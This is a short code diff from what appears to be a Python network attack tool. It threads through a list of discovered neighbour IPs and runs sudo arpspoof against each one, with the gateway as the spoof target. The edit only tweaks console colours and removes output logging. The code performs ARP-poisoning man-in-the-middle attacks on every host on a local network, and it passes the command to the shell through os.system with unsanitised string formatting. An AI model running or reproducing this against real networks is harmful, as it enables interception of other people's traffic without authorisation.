@@ -36,14 +36,14 @@ def get_neigh(iface,gw):
     f_ips.close()
     for i,ip in enumerate(ip_table):
         print(Fore.WHITE+'----------------------')
-        print(ip[0] + Fore.GREEN+" Found")
+        print(ip[0] + Fore.GREEN+" Found"+Back.BLACK+Fore.WHITE)
         new_thread=threading.Thread(target=spoof, args=(iface,ip[0],gw,i))
         threads.append(new_thread)
         new_thread.start()
 
 def spoof(iface,ip,gw,i):
     try:
-        spoof_cmd=""" sudo /bin/bash -c 'arpspoof -i {} -t {}  {} > log_{}.txt' """.format(iface,ip,gw,i)
+        spoof_cmd=""" sudo /bin/bash -c 'arpspoof -i {} -t {}  {} ' """.format(iface,ip,gw,i)
         os.system(spoof_cmd)
     except Exception as err:
         print(err)
